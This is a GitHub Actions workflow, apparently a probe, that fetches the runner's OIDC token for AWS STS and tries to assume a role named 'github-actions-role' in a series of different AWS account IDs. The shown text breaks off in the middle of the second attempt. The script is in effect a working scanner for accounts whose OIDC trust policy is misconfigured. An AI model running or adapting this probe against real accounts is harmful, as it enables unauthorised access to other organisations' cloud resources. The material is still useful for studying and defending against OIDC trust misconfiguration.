name: STS Oracle v8
on:
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: STS Probe v8 targeted
        run: |
          TOKEN=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")
          echo "TOKEN_OK=true"

            R_V00=$(aws sts assume-role-with-web-identity \
              --role-arn "arn:aws:iam::062341577280:role/github-actions-role" \
              --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
            echo "062341577280: $R_V00"
            R_V01=$(aws sts assume-role-with-web-identity \
              --role-arn "arn:aws:iam::641684308908:role/github-actions-role" \
